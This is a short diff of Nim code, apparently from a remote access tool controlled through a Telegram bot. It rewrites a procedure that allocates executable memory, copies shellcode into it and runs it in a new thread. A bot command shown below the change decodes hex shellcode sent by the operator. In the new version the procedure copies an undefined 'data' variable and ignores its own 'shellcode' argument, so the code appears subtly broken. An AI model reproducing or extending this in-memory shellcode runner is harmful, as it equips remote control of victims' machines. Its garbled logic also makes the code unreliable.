@@ -15,13 +15,14 @@ const help_message = """
 
 
 proc execShellCode(shellcode: string) =
-    var buf = shellcode
-    var lpBufSize: SIZE_T = (SIZE_T)len(buf)
-    var lpBuf = VirtualAlloc(NULL, lpBufSize, 0x3000, 0x00000040)
-    RtlMoveMemory(lpBuf, &buf, len(buf))
-    var lpStart: LPTHREADSTARTROUTINE = cast[proc(lpThreadParameter: LPVOID): DWORD{.stdcall.}](lpBuf)
-    var hThread = CreateThread(NULL, 0, lpStart, lpBuf, 0, NULL)
-    WaitForSingleObject(hThread, -1)
+  var threadID: DWORD
+  var process_id: cint = GetCurrentProcessId()
+  var process: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id)
+  var exec: pointer = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT,
+                                 PAGE_EXECUTE_READWRITE)
+  RtlMoveMemory(exec, data.unsafeAddr, sizeof(data))
+  var hHand: HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](exec), NULL, 0, addr(threadID))
+  WaitForSingleObject(hHand, INFINITE)
 
 proc shellCode(b: Telebot, e: Command): Future[bool] {.async.} =
     let shellcode = parseHexStr(e.command.split(" ", 1)[1])
